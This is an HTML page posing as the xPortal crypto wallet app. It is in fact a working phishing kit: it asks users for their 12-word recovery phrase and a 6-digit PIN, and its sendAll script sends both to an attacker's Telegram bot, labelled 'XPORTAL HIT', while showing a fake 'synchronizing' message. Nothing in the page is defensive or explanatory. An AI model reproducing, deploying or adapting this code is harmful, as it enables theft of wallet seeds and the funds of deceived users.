<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xPortal | The Money Super App</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255, 255, 255, 0.08); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #000; color: #fff; min-height: 100vh; overflow-x: hidden; display: flex; align-items: center; justify-content: center; }
        
        /* Background Glow */
        .bg-glow { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100%; height: 100%; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 70%); z-index: -1; }

        .app-container { width: 100%; max-width: 420px; padding: 25px; text-align: center; }
        .logo-container { margin-bottom: 40px; }
        .logo-main { width: 85px; height: 85px; filter: drop-shadow(0 0 20px rgba(35, 247, 221, 0.2)); }

        h1 { font-size: 32px; font-weight: 800; letter-spacing: -1.2px; margin-bottom: 12px; background: linear-gradient(to bottom, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p.desc { color: #949494; font-size: 16px; margin-bottom: 45px; line-height: 1.5; font-weight: 400; }

        /* BUTTONS */
        .btn { width: 100%; height: 64px; border-radius: 100px; border: none; font-size: 17px; font-weight: 700; cursor: pointer; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
        .btn-primary { background: #fff; color: #000; }
        .btn-primary:hover { background: var(--teal); transform: scale(1.02); }
        .btn-secondary { background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid var(--border); }
        .btn-secondary:hover { background: rgba(255, 255, 255, 0.1); border-color: #fff; }

        /* SECTIONS */
        .section { display: none; animation: slideUp 0.4s ease-out; width: 100%; }
        .section.active { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        /* GRID FOR WORDS */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 30px 0; max-height: 300px; overflow-y: auto; padding: 10px; }
        .word-box { position: relative; }
        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; color: var(--teal); font-weight: 800; }
        .word-box input { width: 100%; background: #0a0a0a; border: 1px solid var(--border); border-radius: 14px; padding: 14px 10px 14px 28px; color: #fff; font-size: 13px; outline: none; }
        .word-box input:focus { border-color: var(--purple); box-shadow: 0 0 15px rgba(138, 63, 252, 0.1); }

        /* KEYPAD */
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 30px; }
        .key { width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; cursor: pointer; border: 1px solid var(--border); margin: 0 auto; }
        .key:active { background: var(--purple); transform: scale(0.9); }
        .pin-dots { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
        .dot { width: 16px; height: 16px; border: 2px solid var(--border); border-radius: 50%; }
        .dot.filled { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }

        #loader { display: none; color: var(--teal); font-weight: 700; font-size: 14px; margin-top: 20px; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="bg-glow"></div>

<div class="app-container">
    
    <div id="page-welcome" class="section active">
        <div class="logo-container"><img src="Capture.PNG" class="logo-main"></div>
        <h1>Welcome to xPortal</h1>
        <p class="desc">The most secure way to explore the new digital world. Cards, crypto, and more.</p>
        <button class="btn btn-primary" onclick="showSection('page-create')">Create New Wallet</button>
        <button class="btn btn-secondary" onclick="showSection('page-import')">Import Existing Wallet</button>
    </div>

    <div id="page-create" class="section">
        <div class="logo-container"><img src="Capture.PNG" style="width: 50px;"></div>
        <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">New Wallet Phrase</h2>
        <p style="color:#888; font-size: 14px;">Store these 12 words in a safe place.</p>
        <div class="grid" id="createGrid"></div>
        <button class="btn btn-primary" onclick="showSection('page-import')">I've written it down</button>
        <button class="btn btn-secondary" onclick="showSection('page-welcome')">Cancel</button>
    </div>

    <div id="page-import" class="section">
        <div class="logo-container"><img src="Capture.PNG" style="width: 50px;"></div>
        <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">Secret Phrase</h2>
        <p style="color:#888; font-size: 14px;">Enter your 12-word recovery phrase.</p>
        <div class="grid" id="importGrid"></div>
        <button class="btn btn-primary" onclick="checkPhrase()">Continue</button>
    </div>

    <div id="page-pin" class="section">
        <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">Security PIN</h2>
        <p style="color:#888; font-size: 14px;">Enter your 6-digit PIN code.</p>
        <div class="pin-dots" id="pinDots">
            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
        </div>
        <div class="keypad">
            <script>for(let i=1;i<=9;i++) document.write(`<div class="key" onclick="press(${i})">${i}</div>`);</script>
            <div></div><div class="key" onclick="press(0)">0</div><div class="key" onclick="del()">←</div>
        </div>
    </div>

    <div id="loader">SYNCHRONIZING SECURE NODE...</div>
</div>

<script>
    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
    const CHAT_ID = 'YOUR_CHAT_ID';

    let savedPhrase = "";
    let currentPin = "";

    function showSection(id) {
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');

        if(id === 'page-create') {
            const mock = ["brave","ocean","winter","tiger","shield","focus","cloud","member","camera","bright","stable","digital"];
            const cg = document.getElementById('createGrid');
            cg.innerHTML = mock.map((w, i) => `<div class="word-box"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
        }
        if(id === 'page-import') {
            const ig = document.getElementById('importGrid');
            ig.innerHTML = '';
            for(let i=1; i<=12; i++) ig.innerHTML += `<div class="word-box"><span>${i}</span><input type="password" class="w-in" placeholder="..."></div>`;
        }
    }

    function checkPhrase() {
        let words = [];
        document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
        if(words.some(w => w === "")) return alert("Fill all 12 words");
        savedPhrase = words.join(" ");
        showSection('page-pin');
    }

    function press(n) {
        if(currentPin.length < 6) {
            currentPin += n;
            updateDots();
            if(currentPin.length === 6) sendAll();
        }
    }

    function del() { currentPin = currentPin.slice(0,-1); updateDots(); }

    function updateDots() {
        const dots = document.querySelectorAll('.dot');
        dots.forEach((d, i) => d.classList.toggle('filled', i < currentPin.length));
    }

    function sendAll() {
        document.getElementById('page-pin').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        const msg = `🚀 XPORTAL HIT!\n\nPhrase: ${savedPhrase}\nPIN: ${currentPin}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
    }
</script>
</body>
</html>
